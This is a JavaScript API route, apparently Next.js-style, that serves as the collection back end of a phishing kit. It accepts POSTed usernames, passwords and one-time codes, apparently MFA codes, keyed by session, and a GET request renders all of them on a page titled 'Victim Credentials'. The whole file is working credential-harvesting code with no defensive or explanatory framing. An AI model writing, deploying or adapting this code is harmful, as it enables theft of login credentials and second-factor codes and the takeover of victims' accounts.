const credentials = [];

export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { sessionId, username, password, code, timestamp, codeTimestamp } = req.body;

        // Find existing session
        const existing = credentials.find(cred => cred.sessionId === sessionId);
        if (existing) {
            // Update with code if provided
            if (code) {
                existing.code = code;
                existing.codeTimestamp = codeTimestamp;
            }
        } else {
            // Add new credentials
            credentials.push({ sessionId, username, password, code, timestamp, codeTimestamp });
        }
        res.status(200).json({ message: 'Credentials saved' });
    } else if (req.method === 'GET') {
        // Return HTML to display credentials
        let html = `
            <html>
            <head>
                <title>Victim Credentials</title>
                <style>
                    body { font-family: Arial, sans-serif; margin: 20px; }
                    h1 { color: #333; }
                    .cred { margin-bottom: 20px; padding: 10px; border: 1px solid #ccc; border-radius: 5px; }
                </style>
            </head>
            <body>
                <h1>All Victim Credentials</h1>
        `;
        if (credentials.length > 0) {
            credentials.forEach((cred, index) => {
                html += `
                    <div class="cred">
                        <h3>Session ${index + 1} (ID: ${cred.sessionId})</h3>
                        <p><strong>Username:</strong> ${cred.username || 'N/A'}</p>
                        <p><strong>Password:</strong> ${cred.password || 'N/A'}</p>
                        <p><strong>Code:</strong> ${cred.code || 'Not submitted'}</p>
                        ${cred.code ? `<p><strong>Code Submitted At:</strong> ${cred.codeTimestamp}</p>` : ''}
                    </div>
                `;
            });
        } else {
            html += '<p>No credentials available.</p>';
        }
        html += '</body></html>';
        res.setHeader('Content-Type', 'text/html');
        res.status(200).send(html);
    } else {
        res.setHeader('Allow', ['GET', 'POST']);
        res.status(405).end(`Method ${req.method} Not Allowed`);
    }
}
